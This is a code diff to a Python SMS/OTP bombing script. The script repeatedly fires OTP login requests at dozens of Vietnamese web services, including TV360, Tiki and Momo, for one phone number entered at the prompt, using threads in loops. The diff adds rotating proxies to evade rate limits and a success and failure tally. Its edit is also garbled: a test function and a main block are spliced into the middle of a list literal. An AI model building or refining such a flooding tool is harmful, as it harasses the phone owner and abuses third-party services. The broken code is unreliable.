@@ -10,6 +10,22 @@ init(autoreset=True)
 
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
+proxies_list = [
+    'http://proxy1.example.com:8080',
+    'http://proxy2.example.com:8080',
+    'http://proxy3.example.com:8080',
+    # Add more proxies as needed
+]
+
+def get_random_proxy():
+    return {'http': random.choice(proxies_list), 'https': random.choice(proxies_list)} if proxies_list else None
+
+http = urllib3.PoolManager(
+    cert_reqs='CERT_REQUIRED',
+    ca_certs='/path/to/your/certificate-authority-bundle-file',
+    proxies=get_random_proxy()
+)
+
 http = urllib3.PoolManager(
     cert_reqs='CERT_REQUIRED',
     ca_certs='/path/to/your/certificate-authority-bundle-file'
@@ -44,6 +60,7 @@ def generate_random_email(domain='example.com'):
 random_email = generate_random_email()
 
 def tv360():
+    proxy = get_random_proxy()
     cookies = {
         'img-ext': 'avif',
         'NEXT_LOCALE': 'vi',
@@ -83,7 +100,7 @@ def tv360():
     }
 
     try:
-        response = requests.post('https://tv360.vn/public/v1/auth/get-otp-login', cookies=cookies, headers=headers, json=json_data)
+        response = requests.post('https://tv360.vn/public/v1/auth/get-otp-login', cookies=cookies, headers=headers, json=json_data, proxies=proxy)
         response.raise_for_status()  # Raise an exception for HTTP errors
         print("TV360 | TRẠNG THÁI : THÀNH CÔNG")
     except requests.exceptions.RequestException:
@@ -3330,21 +3347,57 @@ functions = [
     vinfastescooter, taskal, star_t, nhadatvui,
     mocha35, thuongdo, unica, monkeyjunior,
     babilala, edupia, vkids, mytv, ahamove,
+
+
+def test_apis():
+    print("Testing APIs for phone number:", sdt)
+    
+    # Test a few services
+    print("\nTesting TV360...")
+    tv360()
+    
+    time.sleep(1) # Delay between calls
+    
+    print("\nTesting Tiki...")
+    tiki()
+    
+    time.sleep(1)
+    
+    print("\nTesting Momo...")
+    momo()
+
+# Test the APIs
+if __name__ == "__main__":
+    sdt = input("Nhập số điện thoại: ")
+    test_apis()
+
+
     cathaylife, prepedu, bigm, atmnha, hvb, zodi,
     dynaminds, gicula, dalatbds, mocha2, jupviec, guvi,
     aio, fpt, unicar, lozido, pingpush, ting,
     kanow, butlsms, butlzl, ilokafood, vieclam24h,
     sobanhangzl, sobanhang, sfin, sapo,
-    truedoc, upos, ghephang, hoatoc247, gotp,
-    # Thêm một số API mới vào đây:
-    meta, popeys, mykiot, chongluadao, dkvt,
-    vietlott, onecredit, dongplus, oncredit, vayvnd,
-    robocash, yomoney, lovemoney, viettelpay, vayno,
-    mobifone, caydenthan, findo, tienoi, senmo
+    truedoc, upos, ghephang, hoatoc247, gotp
 ]
+
+print("Bắt đầu gửi OTP...")
+success = 0
+failed = 0
 
 with concurrent.futures.ThreadPoolExecutor() as executor:
     for i in range(count):
+        print(f"\nLần {i+1}/{count}")
+        futures = []
         for func in functions:
-            executor.submit(func)
-            time.sleep(0)
+            future = executor.submit(func)
+            futures.append(future)
+            time.sleep(0.1) # Delay để tránh spam quá nhanh
+            
+        for future in concurrent.futures.as_completed(futures):
+            try:
+                future.result()
+                success += 1
+            except Exception:
+                failed += 1
+                
+print(f"\nKết quả: Thành công: {success} | Thất bại: {failed}")
